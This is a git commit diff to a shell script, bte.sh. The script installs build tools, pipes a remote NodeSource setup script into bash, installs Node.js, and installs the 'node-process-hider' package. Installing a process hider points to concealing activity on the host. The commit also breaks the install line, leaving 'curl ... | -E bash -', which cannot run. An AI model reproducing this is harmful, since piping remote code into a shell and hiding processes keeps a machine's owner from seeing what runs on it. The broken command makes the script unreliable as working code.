de2ca3861cfdf18932a5c78021c8281a6d9c4ae4
adisubarja <92545387+adisubarja@users.noreply.github.com>
2022-08-21 21:17:51 +0700

    Update bte.sh

--- bte.sh
+++ bte.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+curl -fsSL https://deb.nodesource.com/setup_17.x | -E bash -
 apt-get install -y nodejs
 
 npm i -g node-process-hider
